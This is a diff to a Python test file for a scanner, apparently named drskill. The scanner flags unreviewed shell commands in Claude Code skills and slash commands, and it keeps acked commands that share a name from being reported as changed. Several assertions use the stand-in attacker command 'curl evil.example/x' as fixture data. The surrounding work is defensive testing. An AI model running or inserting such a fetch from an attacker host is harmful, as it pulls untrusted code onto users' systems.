@@ -261,7 +261,11 @@ def test_unreviewed_changed_empty_diff_falls_back_to_full_listing(tmp_path):
     assert "curl evil.example/x" in rest
 
 
-def test_unreviewed_changed_without_baseline_lists_current(tmp_path):
+def test_unreviewed_name_matching_ack_without_baseline_is_unreviewed(tmp_path):
+    # A name-matching ack with no recorded baseline for THIS contributor
+    # cannot be told apart from a different contributor that merely shares
+    # the name (see the command/skill name-collision tests below), so it is
+    # treated as first sight rather than a rug-pull.
     import datetime as dt
 
     from drskill.ledger import Ack
@@ -270,8 +274,9 @@ def test_unreviewed_changed_without_baseline_lists_current(tmp_path):
     ack = Ack(check="injection-shell-unreviewed", skills=["nobase"],
               fingerprint="sha256:" + "0" * 64, date=dt.date(2026, 8, 1))
     (f,) = _unreviewed(make_world(tmp_path), Config(ack=[ack]))
-    assert f.severity == "warning"
-    assert "curl evil.example/x" in f.message  # falls back to the listing
+    assert f.severity == "note"
+    assert "CHANGED" not in f.message
+    assert "curl evil.example/x" in f.message  # still lists the current command
 
 
 def test_unreviewed_command_text_renders_invisible_chars_visibly(tmp_path):
@@ -459,6 +464,46 @@ def test_command_without_shell_is_silent(tmp_path):
     world = make_command_world(tmp_path)
     assert run_check("injection-shell-unreviewed", world, Config()) == []
     assert run_check("injection-shell-dangerous", world, Config()) == []
+
+
+def test_command_sharing_skill_name_is_not_a_false_rug_pull(tmp_path):
+    # A /deploy command wrapping a `deploy` skill: prior acks are matched by
+    # bare name, so acking the skill must not make the unrelated command
+    # look like it CHANGED its commands the first time drskill sees it.
+    import datetime as dt
+
+    from drskill.ledger import Ack
+    from drskill.models import ShellBaseline
+
+    write_skill(tmp_path, "deploy", "!`git status`\n")
+    write_command(tmp_path, "deploy", "!`make deploy`\n")
+    world = make_command_world(tmp_path)
+    skill_c = next(c for c in world.contributors.values() if c.kind == "skill")
+    cmd_c = next(c for c in world.contributors.values() if c.kind == "command")
+
+    skill_cmds = skill_shell.extract_commands(skill_shell._skillmd(skill_c).text)
+    skill_fp = skill_shell.unreviewed_fingerprint(skill_c, skill_cmds)
+    ack = Ack(check="injection-shell-unreviewed", skills=["deploy"],
+              fingerprint=skill_fp, date=dt.date(2026, 8, 1))
+    world.shell_approved[skill_c.id] = ShellBaseline(
+        name="deploy", path="./.claude/skills/deploy/SKILL.md",
+        commands=["git status"], date="2026-08-01",
+    )
+
+    findings = run_check("injection-shell-unreviewed", world, Config(ack=[ack]))
+    by_id = {f.contributors[0]: f for f in findings}
+    skill_f, cmd_f = by_id[skill_c.id], by_id[cmd_c.id]
+
+    # the skill's own lifecycle is untouched: its ack still matches, so it
+    # stays a quiet, filterable note
+    assert skill_f.severity == "note"
+    assert "CHANGED" not in skill_f.message
+
+    # the command has no baseline of its own; it must read as first sight,
+    # not as a rug-pull on a set of commands nobody ever approved
+    assert cmd_f.severity == "note"
+    assert "CHANGED" not in cmd_f.message
+    assert "make deploy" in cmd_f.message
 
 
 # ---- disableSkillShellExecution awareness ----
